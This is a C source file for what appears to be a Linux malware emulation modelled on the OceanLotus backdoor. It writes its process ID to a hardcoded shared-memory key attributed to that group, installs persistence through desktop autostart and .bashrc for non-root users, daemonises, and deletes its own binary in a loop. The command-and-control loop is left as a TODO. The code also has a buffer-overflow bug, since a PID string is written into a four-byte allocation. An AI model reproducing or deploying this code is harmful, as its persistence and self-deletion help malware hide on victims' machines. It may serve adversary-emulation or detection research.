#include <sys/shm.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>

#include "utils.h"
#include "persistence.h"


int main(int argc, char *argv[]) {

    pid_t id = getuid();
    int pid = getpid();

    // TODO: session_dbus_file_write
    //
    create_lock();

    // Creating shared mem w/ unique key
    // File /proc/sysvipc/shm contains the memory key artifacts.
    // this hardcoded key is used by Ocean Lotus
    int fd = shmget(0x64b2e2,  8, IPC_CREAT | 0666);
    if (fd < 0) {
        fprintf(stderr, "error creating shared mem: %s", strerror(errno));
        return -1;
    }
    void *addr = shmat(fd, NULL, 0);
    char *c_pid = (char *)malloc(sizeof(int));
    sprintf(c_pid, "%d", pid); // copy int pid to char* c_pid.
    memcpy(addr, c_pid, 8); // writing PID to shared mem.

    //debugging current pid vs pid in shared mem
    //printf("PID is: %d\n", getpid());
    //printf("PID is: %s\n", (char *)addr);

    //bool result = monitor_proc(31337);

    // if non root do ...
    if (id == 0) {
        // run in the background
        daemon(0, 0);
        // TODO - spawn root thread, and perform root operations

    } else { // non-root user....

        // TODO encapsulate this in a separate function?
        bool res = nonroot_desktop_persistence();
        if (res == false ){
            fprintf(stderr, "error creating nonroot desktop persistence: %s",
                    strerror(errno));
        }

        res = nonroot_bashrc_persistence();
        if (res == false){
            fprintf(stderr, "Error creating bashrc desktop persistence: %s",
                    strerror(errno));
        }
    }

   while(1) {
       self_delete(argv[0]); //  deleting this binary.
       daemon(0, 0);
       sleep(30); // keep process running in background as "daemon".
   }

    // TODO: home dir creation?
    // TODO: main_c2_loop

    free(c_pid);
    return 0;
}
